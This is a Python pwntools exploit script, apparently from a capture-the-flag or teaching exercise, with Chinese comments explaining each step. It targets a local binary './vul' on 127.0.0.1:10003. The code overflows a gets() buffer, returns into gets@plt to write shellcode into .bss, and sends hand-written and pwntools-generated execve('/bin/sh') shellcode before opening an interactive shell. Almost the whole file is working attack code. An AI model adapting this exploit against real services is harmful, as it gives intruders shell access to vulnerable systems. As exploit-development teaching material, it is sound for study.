#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.arch = 'i386'
shellcode = asm("""
jmp sh
do:

xor eax, eax
pop ebx
lea ecx, [ebx+8]
lea edx, [ebx+12]
mov [ebx+7], al
mov [ecx], ebx
mov [edx], eax
mov al, 11
int 0x80

sh:
  call do
""") + '/bin/sh'
r = remote('127.0.0.1', 10003)

elf = ELF('./vul')
gets = elf.symbols['gets']
buf = elf.bss() + 0xf00

raw_input('pause')

#r.send(cyclic(500) +'\n')
# p32自動將address翻成little endian
#r.send('A'*112 + p32(0x12345678) + '\n') #'A'*112 is to bufferoverflow to cover the content before return address of `gets`, and the p32 is to cover the ret address of `gets`
#r.send('A'*112 + p32(0x08048310) + '\n') # we make the gets jump to another gets
r.send('A'*112 + # padding
#        p32(0x08048310) + # address of gets@plt
        p32(gets) + # use ELF to get the gets address
#        'AAAA' + # this will be taken as the return address of our gets@plt
        p32(buf) +
        p32(buf) +
#        p32(0x0804b000 - 0x100) + # we let gets returns to the buffer, thus our buffer(shellcode) will be executed.
#        p32(0x0804b000 - 0x100) + # we want the buffer is at the ned of .got, which is in .DATA Segment can be accessed as data section
        '\n')
#以下兩行為測試程式是否跑得正確
#r.send('\xeb\xfe') # x86組語中這個為while無窮迴圈, 用來測試說我們的address是否是對的，若對的話應可順利卡住不讓程式繼續跑下去
#r.send('\xff\xff\xff\n') # 此為不合法的指令(illegal instruction)，應該可讓程式crash
#r.send('AAAA\n') # segmentation fault

#print enhex(shellcode)
#r.send(shellcode + '\n')
r.send(asm(shellcraft.sh()) + '\n')

r.interactive()
